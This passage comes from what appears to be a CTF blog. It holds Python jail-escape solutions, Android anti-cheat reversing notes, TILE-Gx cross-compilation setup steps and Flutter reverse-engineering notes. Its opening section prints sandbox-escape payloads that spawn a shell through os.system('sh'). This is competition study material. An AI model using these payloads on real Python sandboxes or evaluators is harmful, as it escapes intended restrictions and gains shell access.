<h3 id="SAFEEVAL"><a href="#SAFEEVAL" class="headerlink" title="SAFEEVAL"></a>SAFEEVAL</h3><p>Use lambda to wrap up RCE</p>
<p>payload:</p>
<pre><code>(lambda: __import__(&#39;os&#39;).system(&#39;sh&#39;))()
</code></pre>
<p><img src="/2022/11/01/pythonJail/safeeval_1.png" alt="safeeval"><br><img src="/2022/11/01/pythonJail/safeeval_2.png" alt="safeeval"></p>
<h3 id="LEVEL7"><a href="#LEVEL7" class="headerlink" title="LEVEL7"></a>LEVEL7</h3><h6 id="Come-back-later-to-try-to-figure-it-out…"><a href="#Come-back-later-to-try-to-figure-it-out…" class="headerlink" title="Come back later to try to figure it out…"></a>Come back later to try to figure it out…</h6><p>payload:</p>
<blockquote>
<p>@exec<br> @input<br> class X: pass</p>
</blockquote>
<blockquote>
<p><strong>import</strong>(‘os’).system(‘sh’)</p>
</blockquote>
<h5 id="blog"><a href="#blog" class="headerlink" title="blog"></a><a href="https://gynvael.coldwind.pl/n/python_sandbox_escape">blog</a></h5><pre><code>↑# [organizers] Robin_Jadoul solution↑
</code></pre>
<p><img src="/2022/11/01/pythonJail/level7wp1.png" alt="level7"><br><img src="/2022/11/01/pythonJail/level7wp2.png" alt="level7"></p>
<h3 id="Ok-so-that’s-the-end-of-the-hnctf-There-are-some-thing-that-may-help-you-get-further-about-pyjail"><a href="#Ok-so-that’s-the-end-of-the-hnctf-There-are-some-thing-that-may-help-you-get-further-about-pyjail" class="headerlink" title="Ok, so that’s the end of the hnctf. There are some thing that may help you get further about pyjail:"></a>Ok, so that’s the end of the hnctf. There are some thing that may help you get further about pyjail:</h3><pre><code>https://gynvael.coldwind.pl/n/python_sandbox_escape

https://www.youtube.com/watch?v=Ub_BMOMDOx0

https://zhuanlan.zhihu.com/p/578966149
</code></pre>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>jail</tag>
      </tags>
  </entry>
  <entry>
    <title>vnctf2023</title>
    <url>/2023/02/27/vnctf2023/</url>
    <content><![CDATA[<h3 id="vnctf2023-re"><a href="#vnctf2023-re" class="headerlink" title="vnctf2023 re"></a>vnctf2023 re</h3><ul>
<li><a href="#1.1">BabyAnti</a><span id="more"></span></li>
</ul>
<h4 id="BabyAnti"><a href="#BabyAnti" class="headerlink" title="BabyAnti"></a><div id="1.1">BabyAnti<div></div></div></h4><h5 id="An-android-reverse-problem-The-official-solution-is-to-patch-and-bypass-the-anticheat-module-and-use-CE-to-pass-the-game"><a href="#An-android-reverse-problem-The-official-solution-is-to-patch-and-bypass-the-anticheat-module-and-use-CE-to-pass-the-game" class="headerlink" title="An android reverse problem. The official solution is to patch and bypass the anticheat module and use CE to pass the game."></a>An android reverse problem. The official solution is to patch and bypass the anticheat module and use CE to pass the game.</h5><h5 id="Unpacked-the-apk-and-check-it-in-the-ida-When-the-dynamic-library-been-loaded-it-shall-call-the-function-JNI-OnLoad-We-can-see-four-function-after-it"><a href="#Unpacked-the-apk-and-check-it-in-the-ida-When-the-dynamic-library-been-loaded-it-shall-call-the-function-JNI-OnLoad-We-can-see-four-function-after-it" class="headerlink" title="Unpacked the apk and check it in the ida. When the dynamic library been loaded, it shall call the function JNI_OnLoad. We can see four function after it."></a>Unpacked the apk and check it in the ida. When the dynamic library been loaded, it shall call the function JNI_OnLoad. We can see four function after it.</h5><p><code>ret of four func, to be continue</code></p>
<h5 id="A-antiCheat-class-in-Smali-pack"><a href="#A-antiCheat-class-in-Smali-pack" class="headerlink" title="A antiCheat class in Smali pack"></a>A antiCheat class in Smali pack</h5><p><code>to be continue</code></p>
]]></content>
  </entry>
  <entry>
    <title>交叉编译以及其他架构逆向初探</title>
    <url>/2023/08/26/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E4%BB%A5%E5%8F%8A%E5%85%B6%E4%BB%96%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface-蓝帽杯初赛2023，题目没做出来，理论上能出，实际上没时间，就算有时间估计也不会去看那么多汇编，但是既然结合0CTF2021也有一个类似折磨的pwn题（虽然那个题很多种意义上说其实好很多，即使我还是偏re手）不过感觉还是有很多东西要学以及刚学到，浅记录一下。"><a href="#preface-蓝帽杯初赛2023，题目没做出来，理论上能出，实际上没时间，就算有时间估计也不会去看那么多汇编，但是既然结合0CTF2021也有一个类似折磨的pwn题（虽然那个题很多种意义上说其实好很多，即使我还是偏re手）不过感觉还是有很多东西要学以及刚学到，浅记录一下。" class="headerlink" title="preface: 蓝帽杯初赛2023，题目没做出来，理论上能出，实际上没时间，就算有时间估计也不会去看那么多汇编，但是既然结合0CTF2021也有一个类似折磨的pwn题（虽然那个题很多种意义上说其实好很多，即使我还是偏re手）不过感觉还是有很多东西要学以及刚学到，浅记录一下。"></a>preface: 蓝帽杯初赛2023，题目没做出来，理论上能出，实际上没时间，就算有时间估计也不会去看那么多汇编，但是既然结合0CTF2021也有一个类似折磨的pwn题（虽然那个题很多种意义上说其实好很多，即使我还是偏re手）不过感觉还是有很多东西要学以及刚学到，浅记录一下。</h6><span id="more"></span>

<h5 id="一点前置知识：IoT安全研究视角的交叉编译-Clang裁缝店-xuanxuanblingbling-github-io"><a href="#一点前置知识：IoT安全研究视角的交叉编译-Clang裁缝店-xuanxuanblingbling-github-io" class="headerlink" title="一点前置知识：IoT安全研究视角的交叉编译 | Clang裁缝店 (xuanxuanblingbling.github.io)"></a>一点前置知识：<a href="https://xuanxuanblingbling.github.io/ctf/tools/2021/02/16/cross/">IoT安全研究视角的交叉编译 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></h5><h5 id="这两片可以结合着看看（后面那篇接近我的主要思路，but-failed-QAQ）0CTF-x2F-TCTF-2021-tile-Clang裁缝店-xuanxuanblingbling-github-io-ctf-x2F-2021-07-03-0CTF-TCTF-2021-Quals-x2F-tile-at-master-·-mephi42-x2F-ctf-github-com"><a href="#这两片可以结合着看看（后面那篇接近我的主要思路，but-failed-QAQ）0CTF-x2F-TCTF-2021-tile-Clang裁缝店-xuanxuanblingbling-github-io-ctf-x2F-2021-07-03-0CTF-TCTF-2021-Quals-x2F-tile-at-master-·-mephi42-x2F-ctf-github-com" class="headerlink" title="这两片可以结合着看看（后面那篇接近我的主要思路，but failed. QAQ）0CTF &#x2F; TCTF 2021 tile | Clang裁缝店 (xuanxuanblingbling.github.io)  |  ctf&#x2F;2021.07.03_0CTF_TCTF_2021_Quals&#x2F;tile at master · mephi42&#x2F;ctf (github.com)"></a>这两片可以结合着看看（后面那篇接近我的主要思路，but failed. QAQ）<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2021/07/05/tile/">0CTF &#x2F; TCTF 2021 tile | Clang裁缝店 (xuanxuanblingbling.github.io)</a>  |  <a href="https://github.com/mephi42/ctf/tree/master/2021.07.03_0CTF_TCTF_2021_Quals/tile">ctf&#x2F;2021.07.03_0CTF_TCTF_2021_Quals&#x2F;tile at master · mephi42&#x2F;ctf (github.com)</a></h5><h5 id="基本流程：搭建qemu环境尝试gdb调试（发现缺so，尤其稀有架构的so挺麻烦的）"><a href="#基本流程：搭建qemu环境尝试gdb调试（发现缺so，尤其稀有架构的so挺麻烦的）" class="headerlink" title="基本流程：搭建qemu环境尝试gdb调试（发现缺so，尤其稀有架构的so挺麻烦的）"></a>基本流程：搭建qemu环境尝试gdb调试（发现缺so，尤其稀有架构的so挺麻烦的）</h5><h5 id="objdump切换架构硬看汇编，结合ida识别的段猜（比obj-D-的信息稍微清楚一点，不过要记得）"><a href="#objdump切换架构硬看汇编，结合ida识别的段猜（比obj-D-的信息稍微清楚一点，不过要记得）" class="headerlink" title="objdump切换架构硬看汇编，结合ida识别的段猜（比obj -D 的信息稍微清楚一点，不过要记得）"></a>objdump切换架构硬看汇编，结合ida识别的段猜（比obj -D 的信息稍微清楚一点，不过要记得）</h5><h5 id="猜测是challenge1是-amp-0x7f，challenge2异或，challenge3借助map做了什么操作，怀疑是换序然后简单对字符处理…"><a href="#猜测是challenge1是-amp-0x7f，challenge2异或，challenge3借助map做了什么操作，怀疑是换序然后简单对字符处理…" class="headerlink" title="猜测是challenge1是&amp;0x7f，challenge2异或，challenge3借助map做了什么操作，怀疑是换序然后简单对字符处理…"></a>猜测是<code>challenge1</code>是<code>&amp;0x7f</code>，<code>challenge2</code>异或，<code>challenge3</code>借助map做了什么操作，怀疑是换序然后简单对字符处理…</h5><h6 id="还学了这么个小知识点：原生的qemu不支持NX，故shellcode一把梭应该就行"><a href="#还学了这么个小知识点：原生的qemu不支持NX，故shellcode一把梭应该就行" class="headerlink" title="还学了这么个小知识点：原生的qemu不支持NX，故shellcode一把梭应该就行"></a>还学了这么个小知识点：<code>原生的qemu不支持NX，故shellcode一把梭应该就行</code></h6><hr>
<h5 id="本体搭建过程："><a href="#本体搭建过程：" class="headerlink" title="本体搭建过程："></a>本体搭建过程：</h5><h4 id="qemu运行过程（虽然题目中是缺so的，但是确实是这么个流程）"><a href="#qemu运行过程（虽然题目中是缺so的，但是确实是这么个流程）" class="headerlink" title="- qemu运行过程（虽然题目中是缺so的，但是确实是这么个流程）"></a>- qemu运行过程（虽然题目中是缺so的，但是确实是这么个流程）</h4><h5 id="sudo-apt-install-git-libglib2-0-dev-libfdt-dev-libpixman-1-dev-zlib1g-dev"><a href="#sudo-apt-install-git-libglib2-0-dev-libfdt-dev-libpixman-1-dev-zlib1g-dev" class="headerlink" title="sudo apt install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev"></a><code>sudo apt install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev</code></h5><h5 id="git-clone-https-git-qemu-org-git-qemu-git"><a href="#git-clone-https-git-qemu-org-git-qemu-git" class="headerlink" title="git clone https://git.qemu.org/git/qemu.git"></a><code>git clone https://git.qemu.org/git/qemu.git</code></h5><h5 id="cd-qemu"><a href="#cd-qemu" class="headerlink" title="cd qemu"></a><code>cd qemu</code></h5><h5 id="git-checkout-v5-0-0"><a href="#git-checkout-v5-0-0" class="headerlink" title="git checkout v5.0.0"></a>git checkout v5.0.0</h5><h5 id="configure-target-list-tilegx-linux-user"><a href="#configure-target-list-tilegx-linux-user" class="headerlink" title="./configure --target-list=tilegx-linux-user"></a><code>./configure --target-list=tilegx-linux-user</code></h5><h5 id="make"><a href="#make" class="headerlink" title="make"></a><code>make</code></h5><h5 id="cd-tilegx-linux-user"><a href="#cd-tilegx-linux-user" class="headerlink" title="cd tilegx-linux-user/"></a><code>cd tilegx-linux-user/</code></h5><h5 id="qemu-tilegx-Desktop-newFolder-chall"><a href="#qemu-tilegx-Desktop-newFolder-chall" class="headerlink" title="./qemu-tilegx ./Desktop/newFolder/chall"></a><code>./qemu-tilegx ./Desktop/newFolder/chall</code></h5><h4 id="objdump配置过程："><a href="#objdump配置过程：" class="headerlink" title="- objdump配置过程："></a>- objdump配置过程：</h4><h5 id="wget-https-ftp-gnu-org-gnu-binutils-binutils-2-35-tar-gz"><a href="#wget-https-ftp-gnu-org-gnu-binutils-binutils-2-35-tar-gz" class="headerlink" title="wget https://ftp.gnu.org/gnu/binutils/binutils-2.35.tar.gz"></a><code>wget https://ftp.gnu.org/gnu/binutils/binutils-2.35.tar.gz</code></h5><h5 id="tar-xvf-binutils-2-35-tar-gz"><a href="#tar-xvf-binutils-2-35-tar-gz" class="headerlink" title="tar xvf binutils-2.35.tar.gz"></a><code>tar xvf binutils-2.35.tar.gz</code></h5><h5 id="cd-binutils-2-35"><a href="#cd-binutils-2-35" class="headerlink" title="cd binutils-2.35"></a><code>cd binutils-2.35</code></h5><h5 id="mkdir-build-amp-amp-cd-build"><a href="#mkdir-build-amp-amp-cd-build" class="headerlink" title="mkdir build &amp;&amp; cd build"></a><code>mkdir build &amp;&amp; cd build</code></h5><h5 id="configure-target-tilegx-linux-gnu"><a href="#configure-target-tilegx-linux-gnu" class="headerlink" title="../configure --target=tilegx-linux-gnu"></a><code>../configure --target=tilegx-linux-gnu</code></h5><h5 id="make-1"><a href="#make-1" class="headerlink" title="make"></a><code>make</code></h5><h5 id="tilegx-linux-gnu-objdump-d-Desktop-newFolder-chall-gt-output-asm"><a href="#tilegx-linux-gnu-objdump-d-Desktop-newFolder-chall-gt-output-asm" class="headerlink" title="tilegx-linux-gnu-objdump -d ~/Desktop/newFolder/chall &gt; output.asm"></a><code>tilegx-linux-gnu-objdump -d ~/Desktop/newFolder/chall &gt; output.asm</code></h5><h5 id="即可获得文件的汇编"><a href="#即可获得文件的汇编" class="headerlink" title="即可获得文件的汇编"></a>即可获得文件的汇编</h5>]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>初探flutter</title>
    <url>/2023/08/23/%E5%88%9D%E6%8E%A2flutter/</url>
    <content><![CDATA[<h6 id="preface-起因是WMCTF2023有个anticheat2是基于flutter开发的，中间也得用到相关知识。题目是一下子被队里师傅秒了（555队里师傅秒题太快哩毫无存在感属于是）但是总归还是得来补补功课，啥也不学还是啥也不会。（虽然这会我的安卓环境还是不太彳亍容错很低当时比赛的时候就没有环境跑这个题）"><a href="#preface-起因是WMCTF2023有个anticheat2是基于flutter开发的，中间也得用到相关知识。题目是一下子被队里师傅秒了（555队里师傅秒题太快哩毫无存在感属于是）但是总归还是得来补补功课，啥也不学还是啥也不会。（虽然这会我的安卓环境还是不太彳亍容错很低当时比赛的时候就没有环境跑这个题）" class="headerlink" title="preface: 起因是WMCTF2023有个anticheat2是基于flutter开发的，中间也得用到相关知识。题目是一下子被队里师傅秒了（555队里师傅秒题太快哩毫无存在感属于是）但是总归还是得来补补功课，啥也不学还是啥也不会。（虽然这会我的安卓环境还是不太彳亍容错很低当时比赛的时候就没有环境跑这个题）"></a>preface: 起因是WMCTF2023有个anticheat2是基于flutter开发的，中间也得用到相关知识。题目是一下子被队里师傅秒了（<del>555队里师傅秒题太快哩毫无存在感属于是</del>）但是总归还是得来补补功课，啥也不学还是啥也不会。（<del>虽然这会我的安卓环境还是不太彳亍容错很低当时比赛的时候就没有环境跑这个题</del>）</h6><span id="more"></span>

<h5 id="文档：Flutter-架构概览-Flutter-中文文档-Flutter-中文开发者网站-Flutter"><a href="#文档：Flutter-架构概览-Flutter-中文文档-Flutter-中文开发者网站-Flutter" class="headerlink" title="文档：Flutter 架构概览 - Flutter 中文文档 - Flutter 中文开发者网站 - Flutter"></a>文档：<a href="https://flutter.cn/docs/resources/architectural-overview">Flutter 架构概览 - Flutter 中文文档 - Flutter 中文开发者网站 - Flutter</a></h5><h5 id="参考文章：Reverse-engineering-Flutter-apps-Part-1-tst-sh"><a href="#参考文章：Reverse-engineering-Flutter-apps-Part-1-tst-sh" class="headerlink" title="参考文章：Reverse engineering Flutter apps (Part 1) (tst.sh)"></a>参考文章：<a href="https://blog.tst.sh/reverse-engineering-flutter-apps-part-1/">Reverse engineering Flutter apps (Part 1) (tst.sh)</a></h5><h5 id="Reverse-engineering-Flutter-apps-Part-2-tst-sh"><a href="#Reverse-engineering-Flutter-apps-Part-2-tst-sh" class="headerlink" title="Reverse engineering Flutter apps (Part 2) (tst.sh)"></a><a href="https://blog.tst.sh/reverse-engineering-flutter-apps-part-2/">Reverse engineering Flutter apps (Part 2) (tst.sh)</a></h5><h5 id="TODO：工具"><a href="#TODO：工具" class="headerlink" title="TODO：工具"></a>TODO：<a href="https://bbs.kanxue.com/thread-275287.htm">工具</a></h5><h5 id="flutter逆向初探–-2023国赛ctf的flutterror-1mmorta1的博客-CSDN博客"><a href="#flutter逆向初探–-2023国赛ctf的flutterror-1mmorta1的博客-CSDN博客" class="headerlink" title="flutter逆向初探– 2023国赛ctf的flutterror_1mmorta1的博客-CSDN博客"></a><a href="https://blog.csdn.net/qq_41866334/article/details/131032273">flutter逆向初探– 2023国赛ctf的flutterror_1mmorta1的博客-CSDN博客</a></h5><h5 id="Reverse-Engineering-Flutter-Apps-Guardsquare"><a href="#Reverse-Engineering-Flutter-Apps-Guardsquare" class="headerlink" title="Reverse Engineering Flutter Apps | Guardsquare"></a><a href="https://www.guardsquare.com/blog/current-state-and-future-of-reversing-flutter-apps">Reverse Engineering Flutter Apps | Guardsquare</a></h5><h5 id="Flutter架构：分层系统，上层组件依赖下层组件，组件层间不可越权且各个部分可选可替代（类似层与层间透明）"><a href="#Flutter架构：分层系统，上层组件依赖下层组件，组件层间不可越权且各个部分可选可替代（类似层与层间透明）" class="headerlink" title="Flutter架构：分层系统，上层组件依赖下层组件，组件层间不可越权且各个部分可选可替代（类似层与层间透明）"></a>Flutter架构：分层系统，上层组件依赖下层组件，组件层间不可越权且各个部分可选可替代（类似层与层间透明）</h5><h5 id><a href="#" class="headerlink" title></a><img src="/2023/08/23/%E5%88%9D%E6%8E%A2flutter/archdiagram.webp" alt="archdiagram"></h5><h6 id="对于底层操作系统而言，Flutter-应用程序的包装方式与其他原生应用相同。在每一个平台上，会包含一个特定的嵌入层，从而提供一个程序入口，程序由此可以与底层操作系统进行协调，访问诸如-surface-渲染、辅助功能和输入等服务，并且管理事件循环队列。该嵌入层采用了适合当前平台的语言编写，例如-Android-使用的是-Java-和-C-，-iOS-和-macOS-使用的是-Objective-C-和-Objective-C-，Windows-和-Linux-使用的是-C-。-Flutter-代码可以通过嵌入层，以模块方式集成到现有的应用中，也可以作为应用的主体。-Flutter-本身包含了各个常见平台的嵌入层，同时也-存在一些其他的嵌入层。"><a href="#对于底层操作系统而言，Flutter-应用程序的包装方式与其他原生应用相同。在每一个平台上，会包含一个特定的嵌入层，从而提供一个程序入口，程序由此可以与底层操作系统进行协调，访问诸如-surface-渲染、辅助功能和输入等服务，并且管理事件循环队列。该嵌入层采用了适合当前平台的语言编写，例如-Android-使用的是-Java-和-C-，-iOS-和-macOS-使用的是-Objective-C-和-Objective-C-，Windows-和-Linux-使用的是-C-。-Flutter-代码可以通过嵌入层，以模块方式集成到现有的应用中，也可以作为应用的主体。-Flutter-本身包含了各个常见平台的嵌入层，同时也-存在一些其他的嵌入层。" class="headerlink" title="对于底层操作系统而言，Flutter 应用程序的包装方式与其他原生应用相同。在每一个平台上，会包含一个特定的嵌入层，从而提供一个程序入口，程序由此可以与底层操作系统进行协调，访问诸如 surface 渲染、辅助功能和输入等服务，并且管理事件循环队列。该嵌入层采用了适合当前平台的语言编写，例如 Android 使用的是 Java 和 C++， iOS 和 macOS 使用的是 Objective-C 和 Objective-C++，Windows 和 Linux 使用的是 C++。 Flutter 代码可以通过嵌入层，以模块方式集成到现有的应用中，也可以作为应用的主体。 Flutter 本身包含了各个常见平台的嵌入层，同时也 存在一些其他的嵌入层。"></a>对于底层操作系统而言，Flutter 应用程序的包装方式与其他原生应用相同。在每一个平台上，会包含一个特定的嵌入层，从而提供一个程序入口，程序由此可以与底层操作系统进行协调，访问诸如 surface 渲染、辅助功能和输入等服务，并且管理事件循环队列。该嵌入层采用了适合当前平台的语言编写，例如 Android 使用的是 Java 和 C++， iOS 和 macOS 使用的是 Objective-C 和 Objective-C++，Windows 和 Linux 使用的是 C++。 Flutter 代码可以通过嵌入层，以模块方式集成到现有的应用中，也可以作为应用的主体。 Flutter 本身包含了各个常见平台的嵌入层，同时也 <a href="https://hover.build/blog/one-year-in/">存在一些其他的嵌入层</a>。</h6><h6 id="Flutter-引擎-毫无疑问是-Flutter-的核心，它主要使用-C-编写，并提供了-Flutter-应用所需的原语。当需要绘制新一帧的内容时，引擎将负责对需要合成的场景进行栅格化。它提供了-Flutter-核心-API-的底层实现，包括图形（在-iOS-和-Android-上通过-Impeller，在其他平台上通过-Skia）、文本布局、文件及网络-IO、辅助功能支持、插件架构和-Dart-运行环境及编译环境的工具链。"><a href="#Flutter-引擎-毫无疑问是-Flutter-的核心，它主要使用-C-编写，并提供了-Flutter-应用所需的原语。当需要绘制新一帧的内容时，引擎将负责对需要合成的场景进行栅格化。它提供了-Flutter-核心-API-的底层实现，包括图形（在-iOS-和-Android-上通过-Impeller，在其他平台上通过-Skia）、文本布局、文件及网络-IO、辅助功能支持、插件架构和-Dart-运行环境及编译环境的工具链。" class="headerlink" title="Flutter 引擎 毫无疑问是 Flutter 的核心，它主要使用 C++ 编写，并提供了 Flutter 应用所需的原语。当需要绘制新一帧的内容时，引擎将负责对需要合成的场景进行栅格化。它提供了 Flutter 核心 API 的底层实现，包括图形（在 iOS 和 Android 上通过 Impeller，在其他平台上通过 Skia）、文本布局、文件及网络 IO、辅助功能支持、插件架构和 Dart 运行环境及编译环境的工具链。"></a><strong>Flutter 引擎</strong> 毫无疑问是 Flutter 的核心，它主要使用 C++ 编写，并提供了 Flutter 应用所需的原语。当需要绘制新一帧的内容时，引擎将负责对需要合成的场景进行栅格化。它提供了 Flutter 核心 API 的底层实现，包括图形（在 iOS 和 Android 上通过 <a href="https://flutter.cn/docs/perf/impeller">Impeller</a>，在其他平台上通过 <a href="https://skia.org/">Skia</a>）、文本布局、文件及网络 IO、辅助功能支持、插件架构和 Dart 运行环境及编译环境的工具链。</h6><h6 id="引擎将底层-C-代码包装成-Dart-代码，通过-dart-ui-暴露给-Flutter-框架层。该库暴露了最底层的原语，包括用于驱动输入、图形、和文本渲染的子系统的类。"><a href="#引擎将底层-C-代码包装成-Dart-代码，通过-dart-ui-暴露给-Flutter-框架层。该库暴露了最底层的原语，包括用于驱动输入、图形、和文本渲染的子系统的类。" class="headerlink" title="引擎将底层 C++ 代码包装成 Dart 代码，通过 dart:ui 暴露给 Flutter 框架层。该库暴露了最底层的原语，包括用于驱动输入、图形、和文本渲染的子系统的类。"></a><strong>引擎将底层 C++ 代码包装成 Dart 代码，通过 <a href="https://github.com/flutter/engine/tree/master/lib/ui"><code>dart:ui</code></a> 暴露给 Flutter 框架层。该库暴露了最底层的原语，包括用于驱动输入、图形、和文本渲染的子系统的类。</strong></h6><h5 id="应用结构："><a href="#应用结构：" class="headerlink" title="应用结构："></a>应用结构：<img src="/2023/08/23/%E5%88%9D%E6%8E%A2flutter/app-anatomy.svg" alt="app-anatomy"></h5><h5 id="flutter构建的文件结构："><a href="#flutter构建的文件结构：" class="headerlink" title="flutter构建的文件结构："></a>flutter构建的文件结构：</h5><pre><code class="text">tree .
.
├── arm64-v8a
│   ├── libapp.so
│   └── libflutter.so
└── armeabi-v7a
    ├── libapp.so
    └── libflutter.so
</code></pre>
<p>Android apk包中两个libapp.so文件，它们分别是作为 ELF 二进制文件的 a64 和 a32 快照。gen_snapshots在此处输出ELF&#x2F;共享对象可能会引起误解，它不会将 dart 方法公开为可以在外部调用的符号。相反，这些文件是“cluster 化快照”格式的容器，但在单独的可执行部分中包含编译的代码，以下是它们的结构：</p>
<pre><code class="text">$ aarch64-linux-gnu-objdump -T libapp.so

libapp.so:     file format elf64-littleaarch64

DYNAMIC SYMBOL TABLE:
0000000000001000 g    DF .text  0000000000004ba0 _kDartVmSnapshotInstructions
0000000000006000 g    DF .text  00000000002d0de0 _kDartIsolateSnapshotInstructions
00000000002d7000 g    DO .rodata        0000000000007f10 _kDartVmSnapshotData
00000000002df000 g    DO .rodata        000000000021ad10 _kDartIsolateSnapshotData
</code></pre>
<h5 id="Dart-构建"><a href="#Dart-构建" class="headerlink" title="Dart 构建"></a><a href="https://github.com/dart-lang/sdk/wiki/Building">Dart 构建</a></h5><h5 id="Dart混淆"><a href="#Dart混淆" class="headerlink" title="Dart混淆"></a><a href="https://github.com/flutter/flutter/wiki/Obfuscating-Dart-Code">Dart混淆</a></h5><h5 id="dart-64的寄存器和函数调用约定："><a href="#dart-64的寄存器和函数调用约定：" class="headerlink" title="dart 64的寄存器和函数调用约定："></a>dart 64的寄存器和函数调用约定：</h5><pre><code>       r0 |     | Returns
r0  -  r7 |     | Arguments
r0  - r14 |     | General purpose
      r15 | sp  | Dart stack pointer
      r16 | ip0 | Scratch register
      r17 | ip1 | Scratch register
      r18 |     | Platform register
r19 - r25 |     | General purpose
r19 - r28 |     | Callee saved registers
      r26 | thr | Current thread
      r27 | pp  | Object pool
      r28 | brm | Barrier mask
      r29 | fp  | Frame pointer
      r30 | lr  | Link register
      r31 | zr  | Zero / CSP
</code></pre>
<h5 id="dart-32的寄存器和函数调用约定："><a href="#dart-32的寄存器和函数调用约定：" class="headerlink" title="dart 32的寄存器和函数调用约定："></a>dart 32的寄存器和函数调用约定：</h5><pre><code>r0 -  r1 |     | Returns
r0 -  r9 |     | General purpose
r4 - r10 |     | Callee saved registers
      r5 | pp  | Object pool
     r10 | thr | Current thread
     r11 | fp  | Frame pointer
     r12 | ip  | Scratch register
     r13 | sp  | Stack pointer
     r14 | lr  | Link register
     r15 | pc  | Program counter
</code></pre>
<h5 id="example："><a href="#example：" class="headerlink" title="example："></a>example：</h5><pre><code class="dart">void hello() &#123;
  print(&quot;Hello, World!&quot;);
&#125;
</code></pre>
<pre><code class="asm">Code for optimized function &#39;package:dectest/hello_world.dart_::_hello&#39; &#123;
        ;; B0
        ;; B1
        ;; Enter frame（保存当前函数帧指针和返回地址）
0xf69ace60    e92d4800               stmdb sp!, &#123;fp, lr&#125;;stmdb sp!存储数据前递减寄存器(Store Multiple Decrement Before)
0xf69ace64    e28db000               add fp, sp, #0
        ;; CheckStackOverflow:8(stack=0, loop=0)将字段偏移表（限制个数为36）加载到ip中并检测栈溢出
0xf69ace68    e59ac024               ldr ip, [thr, #+36]
0xf69ace6c    e15d000c               cmp sp, ip
0xf69ace70    9bfffffe               blls +0 ; 0xf69ace70
        ;; PushArgument(v3)
0xf69ace74    e285ca01               add ip, pp, #4096
0xf69ace78    e59ccfa7               ldr ip, [ip, #+4007]
0xf69ace7c    e52dc004               str ip, [sp, #-4]!
        ;; StaticCall:12( print&lt;0&gt; v3)
0xf69ace80    ebfffffe               bl +0 ; 0xf69ace80
0xf69ace84    e28dd004               add sp, sp, #4
        ;; ParallelMove r0 &lt;- C
0xf69ace88    e59a0060               ldr r0, [thr, #+96]
        ;; Return:16(v0)
0xf69ace8c    e24bd000               sub sp, fp, #0
0xf69ace90    e8bd8800               ldmia sp!, &#123;fp, pc&#125;
0xf69ace94    e1200070               bkpt #0x0
&#125;
</code></pre>
<h5 id="another-example"><a href="#another-example" class="headerlink" title="another example:"></a>another example:</h5><pre><code class="asm">// prologue, polymorphic entry
000 | stmdb sp!, &#123;fp, lr&#125;
004 | add fp, sp, #0
008 | sub sp, sp, #4
// optional parameter handling
00c | ldr r0, [r4, #0x13] // arr[2] (positional arg count)
010 | ldr r1, [r4, #0xf]  // arr[1] (argument count)
014 | cmp r0, #0          // check if we have positional args
018 | bgt 0x74            // jump to 08c
// check named args
01c | ldr r0, [r4, #0x17]  // arr[3] (first arg name)
020 | add ip, pp, #0x2000  // 
024 | ldr ip, [ip, #0x4a7] // string &quot;x&quot;
028 | cmp r0, ip           // check if arg present
02c | bne 0x20             // jump to 04c
030 | ldr r0, [r4, #0x1b]    // arr[4] (first arg position)
034 | sub r2, r1, r0         // r2 = arg_count - position
038 | add r0, fp, r2, lsl #1 // r0 = fp + r2 * 2
    |                        // this is really r2 * 4 because it&#39;s an smi
03c | ldr r0, [r0, #4]       // read arg
040 | mov r2, r0             // 
044 | mov r0, #2             // 
048 | b 12                   // jump to 054
04c | ldr r2, [thr, #0x68] // thr-&gt;objectNull
050 | mov r0, #0           // 
054 | str r2, [fp, #-4] // store arg in local
// done loading args
058 | cmp r1, r0 // check if we have read all args
05c | bne 0x30   // jump to 08c
// continue prologe
060 | ldr ip, [thr, #0x24] // thr-&gt;stackLimit
064 | cmp sp, ip           //
068 | blls -0x5af00        // stackOverflowStubWithoutFpuRegsStub
// rest of function
06c | ...
// incompatible args path
08c | ldr r6, [pp, #0x33] // Code* callClosureNoSuchMethod
090 | sub sp, fp, #0      // 
094 | ldmia sp!, &#123;fp, lr&#125; // exit frame
098 | ldr pc, [r6, #3]    // invoke stub
</code></pre>
<p>一些普遍做题思路：先reflutter然后对着dump出来的offset进行hook&#x2F;恢复符号表</p>
<p><del>大概流程懂了，等个环境先</del></p>
<p>ARM交叉编译工具链(32位)：<code>sudo apt-get install gcc-arm-linux-gnueabi binutils-arm-linux-gnueabi</code> (64位)：<code>sudo apt-get install gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu</code></p>
<p>寻找<code>SVC</code>指令出现的地址：<code>aarch64-linux-gnu-objdump -D libapp.so | grep -B2 -A2 --color=always &quot;svc&quot;</code></p>
<hr>
<h6 id="leaves大哥带着在看这个babyanti2，比赛的时候被他高速非预期了，但是现在复盘感觉预期解难度有点离谱的"><a href="#leaves大哥带着在看这个babyanti2，比赛的时候被他高速非预期了，但是现在复盘感觉预期解难度有点离谱的" class="headerlink" title="leaves大哥带着在看这个babyanti2，比赛的时候被他高速非预期了，但是现在复盘感觉预期解难度有点离谱的"></a>leaves大哥带着在看这个babyanti2，比赛的时候被他高速非预期了，但是现在复盘感觉预期解难度有点离谱的</h6><h5 id="目前还没有完整复现，但是大概记录一下："><a href="#目前还没有完整复现，但是大概记录一下：" class="headerlink" title="目前还没有完整复现，但是大概记录一下："></a>目前还没有完整复现，但是大概记录一下：</h5><ul>
<li><p>最简单的先把anti里面的环境检测hook掉</p>
</li>
<li><p>然后合理就去gg修改分数，但是发现有疑似内存检查</p>
</li>
<li><p>flutter的libapp.so恢复符号表（基本上就是我上面说的方法）发现有对内存进行的操作，进行hook</p>
</li>
<li><p>然后不够，libapp.so里面有一个<code>generateShellcodes</code>，非常复杂；可以hook <code>mprotect</code>，发现有一个传入0x7（可读、写、执行）的调用，比较异常，对其操作的0x1000长度的地址dump下来分析，发现好几十个SVC调用</p>
</li>
<li><p>后续： 结论是两层shellcode 调用 mincore，检查是否有内存缺页更改的操作，确实难</p>
</li>
</ul>
<hr>
